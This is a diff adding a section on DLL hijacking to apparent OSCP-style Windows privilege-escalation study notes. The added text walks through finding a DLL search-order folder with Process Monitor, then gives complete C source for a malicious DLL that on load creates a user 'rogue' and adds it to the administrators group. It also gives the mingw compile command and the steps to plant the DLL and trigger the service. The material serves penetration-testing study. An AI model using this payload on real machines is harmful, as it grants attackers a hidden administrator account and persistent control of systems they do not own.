@@ -127,6 +127,45 @@ PS C:\Users\dave> Start-Service BackupMonitor
 **[OSCP Notes](https://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/)**
 **[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)**
 
+Content in module 16.2.2
+
+Move the binary to a Windows machine where you have admin access and open the binary with ProcessMonitor to check the dlls which are being loaded. Check **[dll search order](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#dll-search-order)** to find a folder to locate the malicious dll file.
+
+Now we can build a malicious dll with the following code: (Save it as .cpp file)
+
+```c
+#include <stdlib.h>
+#include <windows.h>
+ 
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+            i = system ("net user rogue password123! /add");
+            i = system ("net localgroup administrators rogue /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+Now we can compile the dll with the following command: 
+```bash
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+And finally we just have to transfer the payload and place it in the folder we have previously located and restart/launch the service to trigger the dll
 #### Unquoted Service Paths
 
 Enumerate running and stopped services.
